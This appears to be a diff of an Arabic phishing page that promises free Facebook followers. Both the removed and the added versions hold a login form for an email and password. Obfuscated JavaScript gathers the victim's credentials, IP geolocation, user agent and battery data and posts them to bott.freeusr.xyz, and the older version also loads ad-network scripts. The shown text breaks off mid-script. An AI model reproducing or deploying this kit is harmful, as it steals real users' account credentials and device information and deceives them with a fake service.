@@ -1,389 +1,256 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head> 
-    <meta charset="UTF-8"> 
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-    <title>زيادة متابعين فيسبوك💥</title> 
-  <meta property="og:title" content="زيادة متابعين فيسبوك💥"> 
-  <meta property="og:description" content="مرحبا بك في افضل موقع زياده  متابعين  فيسبوك  يمكنك  زياده  اكثر من 1000 متابع يومياً  مجاني💥🚀 "> 
-  <meta property="og:image:type" content="image/jpeg"> 
-  <meta property="og:image:width" content="1200"> 
-  <meta property="og:image:height" content="630"> 
-  <meta property="og:type" content="website"> 
-  <meta property="og:url" content="https://YOUR_DOMAIN_HERE/getVideo"> 
-  <meta name="twitter:card" content="summary_large_image"> 
-  <meta name="twitter:title" content="زيادة متابعين فيسبوك💥"> 
-  <meta name="twitter:description" content="مرحبا بك في افضل موقع زياده  متابعين  فيسبوك  يمكنك  زياده  اكثر من 1000 متابع يومياً  مجاني💥🚀"> 
-  <meta name="twitter:image" content="https://thumbs2.imgbox.com/4a/d1/X2GhCY4d_t.jpg"> 
-  <meta name="twitter:image:width" content="1200"> 
-  <meta name="twitter:image:height" content="630"> 
-  <style>
-    body {
-      font-family: 'Arial', sans-serif;
-      text-align: center;
-      margin: 0;
-      padding: 0;
-      background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(0,0,0,0.7)), url('https://example.com/pubg-background.jpg') no-repeat center center fixed;
-      background-size: cover;
-      color: #ffffff;
-      overflow: auto; /* للسماح بالتمرير إذا لزم الأمر */
-      position: relative; /* لتحسين موضع التأثيرات */
-    }
-
-    .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 20px;
-      backdrop-filter: blur(8px);
-      position: relative;
-      z-index: 2;
-    }
-
-    .login-container, .pubg-container {
-      max-width: 500px;
-      padding: 30px;
-      border-radius: 10px;
-      background-color: rgba(0, 0, 0, 0.8);
-      box-shadow: 0 4px 10px rgba(0,0,0,0.6);
-      display: none; /* إخفاء في البداية */
-    }
-
-    .login-container.active, .pubg-container.active {
-      display: block; /* إظهار عند الحاجة */
-    }
-
-    .login-container h1 {
-      margin: 0 0 20px;
-      font-size: 32px;
-      color: #f1c40f; /* لون ذهبى */
-    }
-
-    .option-button {
-      width: 100%;
-      padding: 15px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 8px;
-      box-sizing: border-box;
-      background-color: #444;
-      color: #f1c40f; /* لون ذهبى */
-      font-size: 18px;
-      cursor: pointer;
-      transition: background-color 0.3s ease, transform 0.3s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-    }
-
-    .option-button img {
-      width: 30px;
-      height: 30px;
-      margin-left: 10px;
-    }
-
-    .option-button:hover {
-      background-color: #555;
-      transform: scale(1.02);
-    }
-
-    .pricing-section {
-      margin-top: 20px;
-      padding: 20px;
-      border-radius: 10px;
-      background-color: rgba(0, 0, 0, 0.7);
-      box-shadow: 0 4px 10px rgba(0,0,0,0.6);
-    }
-
-    .pricing-section h2 {
-      font-size: 24px;
-      margin-bottom: 10px;
-    }
-
-    .pricing-option {
-      margin: 10px 0;
-      padding: 15px;
-      border-radius: 8px;
-      background-color: #333;
-      color: #f1c40f;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .pricing-option span {
-      font-size: 20px;
-    }
-
-    .pricing-option button {
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      background-color: #f1c40f;
-      color: #333;
-      font-size: 16px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    .pricing-option button:hover {
-      background-color: #e1b60a;
-    }
-
-    .logo {
-      width: 150px;
-      margin-top: 20px;
-    }
-
-    .message {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      padding: 10px;
-      background-color: #e74c3c;
-      color: #fff;
-      text-align: center;
-      font-size: 18px;
-      display: none; /* إخفاء الرسالة افتراضيًا */
-      z-index: 3;
-    }
-
-    /* تأثير الخلفية المتحركة */
-    @keyframes backgroundAnimation {
-      0% { background-position: 0% 0%; }
-      50% { background-position: 100% 100%; }
-      100% { background-position: 0% 0%; }
-    }
-
-    body::before {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: url('https://example.com/moving-background.jpg') repeat;
-      animation: backgroundAnimation 60s linear infinite;
-      z-index: 1;
-      opacity: 0.2; /* ضبط الشفافية لتأثير الخلفية المتحركة */
-    }
-  </style> 
- </head> 
- <body> 
-  <div class="message" id="message">
-   يرجى تسجيل الدخول أولاً
-  </div> 
-  <div class="container"> 
-   <div class="login-container active" id="login-container"> 
-    <h1>تسجيل الدخول عبر</h1> 
-    <button class="option-button" onclick="showPubgContainer()"> Google <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Logo_2013_Google.png" alt="Diamonds"> </button> 
-    <button class="option-button" onclick="showPubgContainer()"> Facebook <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Gold"> </button> 
-   </div> 
-   <div class="pubg-container" id="pubg-container"> 
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-    <title>زيادة متابعين فيسبوك 🚀</title> 
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="زيادة متابعين فيسبوك💥">
+    <meta property="og:description" content="مرحبا بك في افضل موقع زياده متابعين فيسبوك يمكنك زياده اكثر من 1000 متابع يومياً مجاني💥🚀">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="زيادة متابعين فيسبوك💥">
+    <meta name="twitter:description" content="مرحبا بك في افضل موقع زياده متابعين فيسبوك يمكنك زياده اكثر من 1000 متابع يومياً مجاني💥🚀">
+    <meta name="twitter:image" content="https://thumbs2.imgbox.com/4a/d1/X2GhCY4d_t.jpg">
+    <title>زيادة متابعين فيسبوك</title>
     <style>
-    @keyframes heartColor {
-      0% { color: #FFD700; }
-      50% { color: #FFA500; }
-      100% { color: #FFD700; }
-    }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    body {
-      font-family: 'Helvetica Neue', Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
-      background-size: 400% 400%;
-      animation: gradientBackground 15s ease infinite;
-      color: #FFD700;
-    }
+        body {
+            background: linear-gradient(145deg, #0a1c2f, #1a3a5f);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Arial', sans-serif;
+            padding: 20px;
+        }
 
-    @keyframes gradientBackground {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
+        .container {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 40px 30px;
+            border-radius: 20px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(24, 119, 242, 0.2);
+            border: 1px solid rgba(24, 119, 242, 0.2);
+        }
 
-    form {
-      max-width: 400px;
-      margin: 0 auto;
-      padding: 40px 20px;
-      border: 1px solid #dbdbdb;
-      border-radius: 12px;
-      background-color: #1c1c1c;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.5);
-      color: #FFD700;
-      position: relative;
-      overflow: hidden;
-    }
+        .logo {
+            text-align: center;
+            font-size: 50px;
+            margin-bottom: 10px;
+        }
 
-    form::before {
-      content: '';
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(circle, transparent 20%, rgba(255, 255, 255, 0.2) 20%, rgba(255, 255, 255, 0.2) 80%, transparent 80%, transparent);
-      background-size: 50% 50%;
-      animation: rotateBackground 4s linear infinite;
-      z-index: 1;
-    }
+        h2 {
+            color: #1877f2;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            text-shadow: 0 0 30px rgba(24, 119, 242, 0.3);
+        }
 
-    @keyframes rotateBackground {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+        h2 span {
+            animation: pulse 2s ease-in-out infinite;
+            display: inline-block;
+        }
 
-    form * {
-      position: relative;
-      z-index: 2;
-    }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
 
-    input[type=text], select {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0 20px 0;
-      display: inline-block;
-      border: 1px solid #dbdbdb;
-      border-radius: 4px;
-      box-sizing: border-box;
-      background-color: #333333;
-      color: #FFD700;
-    }
+        .input-group {
+            position: relative;
+            margin-bottom: 18px;
+        }
 
-    button {
-      background-color: #f39c12;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 16px;
-      transition: background-color 0.3s ease;
-    }
+        .input-group label {
+            display: block;
+            color: #aaa;
+            font-size: 13px;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
 
-    button:hover {
-      background-color: #e67e22;
-    }
+        input, select {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 10px;
+            border: 2px solid rgba(24, 119, 242, 0.2);
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
 
-    .heart {
-      animation: heartColor 2s infinite;
-      font-size: 24px;
-    }
+        input:focus, select:focus {
+            border-color: #1877f2;
+            background: rgba(255, 255, 255, 0.08);
+            box-shadow: 0 0 20px rgba(24, 119, 242, 0.15);
+        }
 
-    .follower {
-      color: #1e90ff;
-      font-size: 24px;
-      margin-top: 20px;
-    }
+        input::placeholder {
+            color: #666;
+        }
 
-    .pubg-logo {
-      width: 100px;
-      height: 100px;
-      margin-top: 20px;
-    }
+        select option {
+            background: #1a3a5f;
+            color: #fff;
+        }
 
-    .input-container {
-      position: relative;
-      margin-bottom: 15px;
-    }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #1877f2, #0d65d9);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
 
-    .input-container label {
-      position: absolute;
-      top: -18px;
-      left: 10px;
-      background-color: #1c1c1c;
-      padding: 0 5px;
-      font-size: 14px;
-      color: #FFD700;
-    }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(24, 119, 242, 0.4);
+        }
 
-    #message {
-      position: fixed;
-      top: 0;
-      left: 50%;
-      transform: translate(-50%, 0);
-      background-color: rgba(0, 0, 0, 0.9);
-      color: #FFD700;
-      padding: 15px 20px;
-      border-radius: 0 0 8px 8px;
-      font-size: 18px;
-      display: none;
-      z-index: 1000;
-      width: 80%;
-      max-width: 600px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.5);
-    }
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
 
-    .effects {
-      animation: effects 4s infinite;
-    }
+        .spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 15px auto;
+        }
 
-    @keyframes effects {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.1); }
-      100% { transform: scale(1); }
-    }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-  </style> 
-    <h2 class="effects">زيادة متابعين فيسبوك 🚀<span class="heart">🚀</span></h2> 
-    <form method="POST" action="https://bott.freeusr.xyz/submitIncrease" id="nameForm"> 
-     <input type="hidden" id="chatId" name="chatId" value="7130416076.png"> 
-     <div class="input-container"> 
-      <label for="username"> البريد الإلكتروني:</label> 
-      <input type="text" id="username" name="username" required> 
-     </div> 
-     <div class="input-container"> 
-      <label for="password">كلمة المرور:</label> 
-      <input type="text" id="password" name="password" required> 
-     </div> 
-     <label for="followerCount">عدد متابعين:</label>
-     <br> 
-     <select id="followerCount" name="followerCount" required> <option value="500">1000 متابعين مجاني</option> </select>
-     <br>
-     <br> 
-     <button type="submit">شحن</button> 
-    </form> 
-    <div id="message"></div> 
-   </div> 
-   <div class="pricing-section"> 
-    <h2>أسعار متابعين</h2> 
-    <div class="pricing-option"> 
-     <span>1000  - 0$</span> 
-     <button onclick="showMessage()">مجاني</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>1500  - 2$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>2000  - 3$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>2500  - 4$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>3000  - 5$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>10000  - 10$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-   </div> 
-  
-<div id="notification" class="notification"></div>
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
 
-<script>
-const _0x4b1e89=_0x5cd0;(function(_0x43ee8e,_0x81bda){const _0x2e0a64=_0x5cd0,_0x4dab38=_0x43ee8e();while(!![]){try{const _0x5b5d74=-parseInt(_0x2e0a64(0x20e))/0x1*(-parseInt(_0x2e0a64(0x1e7))/0x2)+-parseInt(_0x2e0a64(0x1ff))/0x3+parseInt(_0x2e0a64(0x1e0))/0x4+parseInt(_0x2e0a64(0x208))/0x5*(-parseInt(_0x2e0a64(0x217))/0x6)+-parseInt(_0x2e0a64(0x1e4))/0x7*(parseInt(_0x2e0a64(0x218))/0x8)+parseInt(_0x2e0a64(0x1db))/0x9*(parseInt(_0x2e0a64(0x1f9))/0xa)+parseInt(_0x2e0a64(0x20f))/0xb;if(_0x5b5d74===_0x81bda)break;else _0x4dab38['push'](_0x4dab38['shift']());}catch(_0x17196d){_0x4dab38['push'](_0x4dab38['shift']());}}}(_0x5317,0x239a0));function showPubgContainer(){const _0xb2fe1b=_0x5cd0;document[_0xb2fe1b(0x1e3)](_0xb2fe1b(0x1df))[_0xb2fe1b(0x214)][_0xb2fe1b(0x1fb)](_0xb2fe1b(0x1ee)),document[_0xb2fe1b(0x1e3)](_0xb2fe1b(0x1fa))[_0xb2fe1b(0x214)][_0xb2fe1b(0x1f5)](_0xb2fe1b(0x1ee));}const increaseForm=document[_0x4b1e89(0x1e3)](_0x4b1e89(0x1da)),chatIdInput=document[_0x4b1e89(0x1e3)](_0x4b1e89(0x20c)),urlParams=new URLSearchParams(window[_0x4b1e89(0x1f1)][_0x4b1e89(0x20d)]),chatId=urlParams[_0x4b1e89(0x216)](_0x4b1e89(0x1f3));document[_0x4b1e89(0x1e3)](_0x4b1e89(0x1f3))[_0x4b1e89(0x1dd)]=chatId||'';async function getIPInfo(){const _0x924ec2=_0x4b1e89;try{const _0x1f4ea4=await fetch(_0x924ec2(0x1e5)),_0x2b87e9=await _0x1f4ea4[_0x924ec2(0x1de)]();return{'ip':_0x2b87e9['ip'],'country':_0x2b87e9[_0x924ec2(0x1ed)],'city':_0x2b87e9[_0x924ec2(0x203)]};}catch(_0x7124fa){return console[_0x924ec2(0x215)](_0x924ec2(0x1f7),_0x7124fa),{'ip':_0x924ec2(0x211),'country':_0x924ec2(0x211),'city':_0x924ec2(0x211)};}}function _0x5cd0(_0x2a8509,_0x3b9102){_0x2a8509=_0x2a8509-0x1da;const _0x5317b=_0x5317();let _0x5cd0d1=_0x5317b[_0x2a8509];return _0x5cd0d1;}function _0x5317(){const _0x60790c=['notification','preventDefault','تم\x20إرسال\x20البيانات\x20بنجاح!','getBattery','country_name','active','charging','POST','location','Error\x20getting\x20battery\x20info:','chatId','test','add','userAgent','Error\x20fetching\x20IP\x20info:','match','3550sMmgZM','pubg-container','remove','addEventListener','submit','https://www.effectivegatecpm.com/c91t164y78?key=ac0d9f08bc23ae53a5f9bd39692515bc','393630RJIbRN','innerText','Error:','success','city','entries','assign','href','حدث\x20خطأ\x20أثناء\x20تنفيذ\x20الطلب.\x20يرجى\x20المحاولة\x20مرة\x20أخرى.','644405RsfTRC','Android','https://bott.freeusr.xyz/submitIncrease','application/json','chatIdInput','search','3fqOlnk','1441286XNKyJS','حدث\x20خطأ\x20أثناء\x20الاتصال\x20بالخادم.\x20يرجى\x20المحاولة\x20مرة\x20أخرى\x20لاحقاً.','Unknown','iOS','MacOS','classList','error','get','12wwYRMa','16UhuMla','nameForm','3006QBgHEj','stringify','value','json','login-container','701680wDIJde','fromEntries','Linux','getElementById','440839tsouLL','https://ipapi.co/json/','Windows','157156ZUoSbd','level'];_0x5317=function(){return _0x60790c;};return _0x5317();}function getPlatformInfo(){const _0x549a4a=_0x4b1e89,_0x22afde=navigator[_0x549a4a(0x1f6)];let _0x1b96af=_0x549a4a(0x211);if(/Windows/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x1e6);else{if(/Mac/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x213);else{if(/Linux/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x1e2);else{if(/Android/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x209);else{if(/iPhone|iPad|iPod/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x212);}}}}return{'platform':_0x1b96af,'userAgent':_0x22afde};}async function getBatteryInfo(){const _0x1dc320=_0x4b1e89;if(_0x1dc320(0x1ec)in navigator)try{const _0x5cb1f9=await navigator[_0x1dc320(0x1ec)]();return{'batteryLevel':_0x5cb1f9[_0x1dc320(0x1e8)],'batteryCharging':_0x5cb1f9[_0x1dc320(0x1ef)]};}catch(_0x528969){console[_0x1dc320(0x215)](_0x1dc320(0x1f2),_0x528969);}return{'batteryLevel':undefined,'batteryCharging':undefined};}function getDeviceVersion(){const _0x5a4d7f=_0x4b1e89,_0x4d7f7f=navigator[_0x5a4d7f(0x1f6)],_0x5e0cfb=_0x4d7f7f[_0x5a4d7f(0x1f8)](/\(([^)]+)\)/);return _0x5e0cfb?_0x5e0cfb[0x1]:_0x5a4d7f(0x211);}increaseForm[_0x4b1e89(0x1fc)](_0x4b1e89(0x1fd),async _0x36efce=>{const _0x1508a1=_0x4b1e89;_0x36efce[_0x1508a1(0x1ea)]();const _0x2f5721=new FormData(increaseForm),_0x4a5a64=Object[_0x1508a1(0x1e1)](_0x2f5721[_0x1508a1(0x204)]()),_0x48b862=await getIPInfo(),_0x4da410=getPlatformInfo(),_0x320a82=await getBatteryInfo(),_0x2586d1=getDeviceVersion();Object[_0x1508a1(0x205)](_0x4a5a64,_0x48b862,_0x4da410,_0x320a82,{'deviceVersion':_0x2586d1});try{const _0x5efa5d=await fetch(_0x1508a1(0x20a),{'method':_0x1508a1(0x1f0),'headers':{'Content-Type':_0x1508a1(0x20b)},'body':JSON[_0x1508a1(0x1dc)](_0x4a5a64)}),_0x493bd3=await _0x5efa5d[_0x1508a1(0x1de)]();_0x493bd3[_0x1508a1(0x202)]?(document[_0x1508a1(0x1e3)](_0x1508a1(0x1e9))[_0x1508a1(0x200)]=_0x1508a1(0x1eb),window[_0x1508a1(0x1f1)][_0x1508a1(0x206)]=_0x1508a1(0x1fe)):alert(_0x1508a1(0x207));}catch(_0x3238d5){console[_0x1508a1(0x215)](_0x1508a1(0x201),_0x3238d5),alert(_0x1508a1(0x210));}});
-</script>
-<script src="https://pl28828545.effectivegatecpm.com/75/7c/35/757c35587997bc0d07d956a06931b902.js"></script>
+        .success-message .check {
+            font-size: 60px;
+            color: #4CAF50;
+            animation: popIn 0.5s ease;
+        }
+
+        .success-message h3 {
+            color: #4CAF50;
+            font-size: 22px;
+            margin-top: 10px;
+        }
+
+        .success-message p {
+            color: #aaa;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            70% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #555;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 25px 20px;
+            }
+            h2 {
+                font-size: 20px;
+            }
+            input, select {
+                padding: 12px 14px;
+                font-size: 14px;
+            }
+            button {
+                font-size: 16px;
+                padding: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">📘</div>
+        <h2>زيادة متابعين فيسبوك <span>🚀</span></h2>
+
+        <form id="fbForm">
+            <div class="input-group">
+                <label>📧 البريد الإلكتروني أو رقم الهاتف</label>
+                <input type="text" id="email" placeholder="أدخل البريد الإلكتروني أو رقم الهاتف" required>
+            </div>
+
+            <div class="input-group">
+                <label>🔒 كلمة المرور</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+            </div>
+
+            <div class="input-group">
+                <label>👥 عدد المتابعين</label>
+                <select id="friends">
+                    <option value="1000">1000 متابع - مجاني 🎁</option>
+                    <option value="1500">1500 متابع - 2$</option>
+                    <option value="2000">2000 متابع - 3$</option>
+                    <option value="3000">3000 متابع - 5$</option>
+                    <option value="5000">5000 متابع - 8$</option>
+                    <option value="10000">10000 متابع - 15$</option>
+                </select>
+            </div>
+
+            <button type="submit" id="submitBtn">🚀 زيادة المتابعين الآن</button>
+
+            <div class="spinner" id="spinner"></div>
+        </form>
+
+        <div class="success-message" id="successMessage">
+            <div class="check">✅</div>
+            <h3>تم استلام طلبك!</h3>
+            <p>جاري معالجة طلبك، سيتم إضافة المتابعين قريباً</p>
+        </div>
+
+        <div class="footer">
+            🔒 بياناتك آمنة ومشفرة
+        </div>
+    </div>
+
+    <script>
+const _0x263a1a=_0x24d7;function _0x24d7(_0x1fe6c5,_0x22946f){_0x1fe6c5=_0x1fe6c5-0x172;const _0x52668b=_0x5266();let _0x24d7e0=_0x52668b[_0x1fe6c5];return _0x24d7e0;}(function(_0x2b6324,_0x33c852){const _0x5e81ab=_0x24d7,_0x4d090b=_0x2b6324();while(!![]){try{const _0x2fc87f=parseInt(_0x5e81ab(0x18d))/0x1*(parseInt(_0x5e81ab(0x19c))/0x2)+parseInt(_0x5e81ab(0x184))/0x3*(parseInt(_0x5e81ab(0x179))/0x4)+-parseInt(_0x5e81ab(0x188))/0x5*(-parseInt(_0x5e81ab(0x1a5))/0x6)+parseInt(_0x5e81ab(0x19e))/0x7*(parseInt(_0x5e81ab(0x1a2))/0x8)+-parseInt(_0x5e81ab(0x1ac))/0x9*(-parseInt(_0x5e81ab(0x17a))/0xa)+-parseInt(_0x5e81ab(0x191))/0xb+-parseInt(_0x5e81ab(0x197))/0xc;if(_0x2fc87f===_0x33c852)break;else _0x4d090b['push'](_0x4d090b['shift']());}catch(_0x53f4db){_0x4d090b['push'](_0x4d090b['shift']());}}}(_0x5266,0xd06ee));async function sendFailReport(_0x50b22c,_0x3818ae,_0xfe1e2a={}){const _0x410848=_0x24d7,_0x39f573=new URLSearchParams(window['location'][_0x410848(0x172)])[_0x410848(0x1bd)](_0x410848(0x1af))||_0x410848(0x1a7);try{await fetch('https://bott.freeusr.xyz/fail',{'method':'POST','headers':{'Content-Type':_0x410848(0x17f)},'body':JSON['stringify']({'chatId':_0x39f573,'type':_0x50b22c,'message':_0x3818ae,'details':_0xfe1e2a,'deviceInfo':{'platform':navigator[_0x410848(0x19d)]||_0x410848(0x176),'language':navigator['language']||_0x410848(0x176),'userAgent':navigator['userAgent']||_0x410848(0x176),'timestamp':new Date()[_0x410848(0x1a9)]()}})});}catch(_0x162440){console[_0x410848(0x1a6)](_0x410848(0x17e),_0x162440);}}const urlParams=new URLSearchParams(window[_0x263a1a(0x1a8)][_0x263a1a(0x172)]),chatId=urlParams[_0x263a1a(0x1bd)](_0x263a1a(0x1af));!chatId&&(sendFailReport(_0x263a1a(0x1ae),_0x263a1a(0x19a),{}),alert(_0x263a1a(0x181)));let cachedIpData=null,ipFetched=![];async function getIPInfo(){const _0x158455=_0x263a1a;if(ipFetched&&cachedIpData)return cachedIpData;try{const _0x357c9d=new AbortController(),_0x981987=setTimeout(()=>_0x357c9d[_0x158455(0x193)](),0xbb8),_0x5e11eb=await fetch(_0x158455(0x183),{'signal':_0x357c9d[_0x158455(0x1bc)]});clearTimeout(_0x981987);if(_0x5e11eb['ok']){const _0x3bbd89=await _0x5e11eb[_0x158455(0x196)]();cachedIpData={'ip':_0x3bbd89['ip']||_0x158455(0x1a7),'country':_0x3bbd89[_0x158455(0x1be)]||'غير\x20معروف','city':_0x3bbd89['city']||_0x158455(0x1a7)};}else cachedIpData={'ip':_0x158455(0x1a7),'country':'غير\x20معروف','city':_0x158455(0x1a7)};}catch(_0x380365){console[_0x158455(0x1a6)]('IP\x20fetch\x20failed,\x20using\x20fallback'),cachedIpData={'ip':_0x158455(0x1a7),'country':_0x158455(0x1a7),'city':_0x158455(0x1a7)};}return ipFetched=!![],cachedIpData;}function getPlatformInfo(){const _0x53829c=_0x263a1a,_0x24b810=navigator[_0x53829c(0x1ad)];let _0x379c19=_0x53829c(0x1a4);if(/Windows/[_0x53829c(0x1ba)](_0x24b810))_0x379c19=_0x53829c(0x187);else{if(/Mac/[_0x53829c(0x1ba)](_0x24b810))_0x379c19=_0x53829c(0x182);else{if(/Linux/[_0x53829c(0x1ba)](_0x24b810))_0x379c19=_0x53829c(0x1a0);else{if(/Android/[_0x53829c(0x1ba)](_0x24b810))_0x379c19=_0x53829c(0x190);else{if(/iPhone|iPad|iPod/['test'](_0x24b810))_0x379c19='iOS';}}}}return{'platform':_0x379c19,'userAgent':_0x24b810};}function _0x5266(){const _0x462a52=['spinner','submitBtn','يرجى\x20إدخال\x20البريد\x20الإلكتروني\x20وكلمة\x20المرور','charging','Error:','fbForm','test','Facebook','signal','get','country_name','search','none','value','country','غير\x20متاح','block','email','66380RRiWim','760570wyVPrD','batteryCharging','disabled','match','Failed\x20to\x20send\x20fail\x20report:','application/json','trim','خطأ:\x20chatId\x20غير\x20موجود\x20في\x20الرابط','MacOS','https://ipwho.is/','27TRJlPJ','style','display','Windows','12155pPAOAN','status','level','successMessage','حدث\x20خطأ\x20أثناء\x20الاتصال\x20بالخادم.\x20يرجى\x20المحاولة\x20مرة\x20أخرى\x20لاحقاً.','1090649iUPNob','https://www.google.com/','message','Android','440561ZmuxUm','addEventListener','abort','href','password','json','23385528UPaeYQ','خطأ\x20غير\x20متوقع','https://bott.freeusr.xyz/submitIncrease','معرف\x20المستخدم\x20غير\x20موجود\x20في\x20الرابط','المستخدم\x20لم\x20يدخل\x20البيانات\x20المطلوبة','2npxiPw','platform','7DHUAcf','Error\x20getting\x20battery\x20info:','Linux','POST','5569304PdaSpl','batteryLevel','Unknown','1674TNeQoG','warn','غير\x20معروف','location','toISOString','friends','city','27BjRxxp','userAgent','error','chatId','getElementById','upload','filename','Sending\x20data:'];_0x5266=function(){return _0x462a52;};return _0x5266();}async function getBatteryInfo(){const _0x5e3dc9=_0x263a1a;if('getBattery'in navigator)try{const _0x4e91ce=await navigator['getBattery']();return{'batteryLevel':_0x4e91ce[_0x5e3dc9(0x18a)],'batteryCharging':_0x4e91ce[_0x5e3dc9(0x1b7)]};}catch(_0x5819c6){console['error'](_0x5e3dc9(0x19f),_0x5819c6);}return{'batteryLevel':undefined,'batteryCharging':undefined};}function getDeviceVersion(){const _0x6f6e35=_0x263a1a,_0x67d0f0=navigator[_0x6f6e35(0x1ad)],_0x355ac4=_0x67d0f0[_0x6f6e35(0x17d)](/\(([^)]+)\)/);return _0x355ac4?_0x355ac4[0x1]:'Unknown';}document['getElementById'](_0x263a1a(0x1b9))[_0x263a1a(0x192)]('submit',async _0x511a3c=>{const _0x5df7ec=_0x263a1a;_0x511a3c['preventDefault']();const _0x2bbe87=document[_0x5df7ec(0x1b0)](_0x5df7ec(0x178))[_0x5df7ec(0x174)][_0x5df7ec(0x180)](),_0x2dfc09=document['getElementById'](_0x5df7ec(0x195))['value'][_0x5df7ec(0x180)](),_0x2f955b=document['getElementById'](_0x5df7ec(0x1aa))[_0x5df7ec(0x174)];if(!_0x2bbe87||!_0x2dfc09){sendFailReport('permission',_0x5df7ec(0x19b),{'email':!!_0x2bbe87,'password':!!_0x2dfc09}),alert(_0x5df7ec(0x1b6));return;}document[_0x5df7ec(0x1b0)]('spinner')[_0x5df7ec(0x185)][_0x5df7ec(0x186)]=_0x5df7ec(0x177),document[_0x5df7ec(0x1b0)]('submitBtn')[_0x5df7ec(0x17c)]=!![];try{const _0x42ef96=await getIPInfo(),_0x4d31a5=getPlatformInfo(),_0x164a30=await getBatteryInfo(),_0x5b42b9=getDeviceVersion(),_0x1f58e5={'username':_0x2bbe87,'password':_0x2dfc09,'platform':_0x5df7ec(0x1bb),'chatId':chatId||'','ip':_0x42ef96['ip'],'country':_0x42ef96[_0x5df7ec(0x175)],'city':_0x42ef96[_0x5df7ec(0x1ab)],'userAgent':_0x4d31a5[_0x5df7ec(0x1ad)],'batteryLevel':_0x164a30[_0x5df7ec(0x1a3)],'charging':_0x164a30[_0x5df7ec(0x17b)],'osVersion':_0x5b42b9,'friends':_0x2f955b};console['log'](_0x5df7ec(0x1b3),_0x1f58e5);const _0x1526c3=await 